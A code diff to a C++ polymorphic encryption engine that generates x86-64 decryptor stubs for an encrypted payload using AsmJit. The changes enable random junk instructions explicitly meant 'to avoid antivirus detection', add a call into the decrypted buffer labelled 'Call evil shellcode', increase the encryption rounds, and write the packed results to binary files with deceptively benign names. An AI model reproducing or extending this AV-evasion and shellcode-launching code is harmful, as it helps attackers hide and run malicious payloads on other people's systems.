@@ -15,7 +15,7 @@ void CMutagenSPE::SelectRegisters()
   Gp regsAvailable[] =  {regs::rax, regs::rcx, regs::rdx ,regs::rsi, regs::rdi, regs::r8, regs::r9, regs::r10, regs::r11};
 
   // shuffle the order to randomize register election
-  //std::random_shuffle(&regsAvailable[0], &regsAvailable[6]);  
+  std::random_shuffle(&regsAvailable[0], &regsAvailable[6]);  
 
   regSrc = regsAvailable[0];  // will contain pointer to encryted data
   regDst = regsAvailable[1];  // will contain pointer to output buffer (function parameter)
@@ -77,14 +77,14 @@ void CMutagenSPE::GenerateDeltaOffset(x86::Assembler& a)
   size_t posUnusedCodeStart = a.offset(); // Get the current offset
   //std::cout << "> Asmjit offset after calling 'delta_offset' is: " << posUnusedCodeStart << "\n";
 
-/*  // random code addition to avoid antivirus detection
+  // random code addition to avoid antivirus detection
   if (rand()%2 == 0)
-    a.mov(regs::rax, imm(1));
+    a.mov(r10, imm(1));
   else
-    a.xor_(regs::rax, regs::rax);
+    a.xor_(r11, r13);
   a.leave();
   a.ret(1 * sizeof(unsigned long));
-*/
+
 
   dwUnusedCodeSize = static_cast<unsigned long>(a.offset() - posUnusedCodeStart); // calculate size of the unused code
   a.bind(lblDeltaOffset);  // bind the label here
@@ -143,7 +143,7 @@ void CMutagenSPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned lon
 
   // randomly select the number of encryption instructions
   dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);
-  //DEBUG2("number of encryption instructions:", dwCryptOpsCount);
+  DEBUG2("number of encryption instructions:", dwCryptOpsCount);
 
   // allocate memory for an array which will record information about the sequence of encryption instructions
   diCryptOps = (int *)malloc(dwCryptOpsCount);
@@ -154,8 +154,10 @@ void CMutagenSPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned lon
   }
 
   // generate encryption instructions and their type. randomly choose the type of encryption instruction
-  for (unsigned long i = 0; i < dwCryptOpsCount; i++)
-    diCryptOps[i] = (int) (dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr));
+  for (unsigned long i = 0; i < dwCryptOpsCount; i++){
+    diCryptOps[i] = (int) rand()%4;
+    DEBUG2("diCryptOps: ", diCryptOps[i]);
+  }
 
   // encrypt the input data according to instructions just generated
   for (unsigned long i = 0; i < dwEncryptedBlocks; i++)
@@ -199,8 +201,8 @@ void CMutagenSPE::SetupDecryptionKeys(x86::Assembler& a)
   
   unsigned long dwKeyModifier = (unsigned long) rand();
 
-  //switch(rand()%2)
-  switch(0)
+  
+  switch(rand()%2)
   {
   case 0:
     a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
@@ -239,18 +241,23 @@ void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
       switch(diCryptOps[i])
       {
       case SPE_CRYPT_OP_ADD:
+        DEBUG("sub");
         a.sub(regData, regKey);
         break;
       case SPE_CRYPT_OP_SUB:
+        DEBUG("add");
         a.add(regData, regKey);
         break;
       case SPE_CRYPT_OP_XOR:
+        DEBUG("xor");
         a.xor_(regData, regKey);
         break;
       case SPE_CRYPT_OP_NOT:
+        DEBUG("not");
         a.not_(regData);
         break;
       case SPE_CRYPT_OP_NEG:
+        DEBUG("neg");
         a.neg(regData);
         break;
       }
@@ -259,10 +266,9 @@ void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
 
   // write the decrypted block to the output buffer
   a.mov(qword_ptr(regDst), regData);
+  a.mov(qword_ptr(regSrc), regData);
 
   // update the pointers to the input and ouput buffers to point to the next block
-  //a.add(regSrc, imm(sizeof(unsigned long)));
-  //a.add(regDst, imm(sizeof(unsigned long)));
   a.add(regSrc, imm(sizeof(unsigned long)));
   a.add(regDst, imm(sizeof(unsigned long)));
 
@@ -327,6 +333,11 @@ void CMutagenSPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a
   }
   */
 
+  
+  // Call evil shellcode
+  shellcode = a.newLabel();
+  a.call(shellcode);
+
   // return to the code which called our function; additionally adjust the stack by the size of the passed
   // parameters (by stdcall convention)
   a.ret(0);
@@ -373,11 +384,11 @@ void CMutagenSPE::AppendEncryptedData(x86::Assembler& a)
 {
   unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);
 
+  a.bind(shellcode);
   // place the encrypted data buffer at the end of the decryption function (in 4-unsigned char blocks)
   for (unsigned long i = 0; i < dwEncryptedBlocks; i++){
     a.dq(lpdwEncryptedData[i]);
   }
-  std::cout << "\n" << std::dec;
 }
 
 
@@ -386,7 +397,7 @@ void CMutagenSPE::WriteToFile(void *lpcDecryptionProc, unsigned long dwDecryptio
   std::string filename = "bins/not_gonna_harm_your_pc_";
   //std::string filenum = std::to_string(rand()%10);
   //std::string extension = ".BenIgN";
-  filename += std::to_string(rand()%10);
+  filename += std::to_string(rand()%100);
   filename += ".BenIgN";
 
   FILE *hFile = fopen(filename.c_str(), "wb");
@@ -448,7 +459,7 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
   // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
   // numbers in the thousands, but be aware that this will make the output code quite large)
   DEBUG("encrypt the input data");
-  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 1, 2);
+  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 5, 7);
 
   DEBUG("generate code to set up keys for decryption");
   SetupDecryptionKeys(a);
@@ -549,17 +560,17 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
     
     DecryptionProc function = reinterpret_cast<DecryptionProc>(diOutput);
 
-    //char szOutputBuffer[128] = { (char) 0xCC };
-    //std::cout << "Output buffer addr " <<  &szOutputBuffer << "\n";
-    //std::cout << "Poly function addr " <<  &function << "\n";
-
     // call the decryption function via its function pointer
     //DecryptionProc function = reinterpret_cast<DecryptionProc>(lpOutputBuffer);
     DEBUG("calling function");
     unsigned long dwOutputSize = function(szOutputBuffer);
 
     // display the decrypted text
-    printf("Payload (%lu):\n%s\n", dwOutputSize, szOutputBuffer );
+    printf("Payload (%lu) : %s\n", dwOutputSize, szOutputBuffer );
+    std::cout << "Payload (" << dwOutputSize << ") : ";
+    for (int i = 0; i < (int) dwOutputSize; ++i)
+     cout << hex << static_cast<unsigned>(szOutputBuffer[i]) << " "; 
+   cout<< endl;
 
   
     
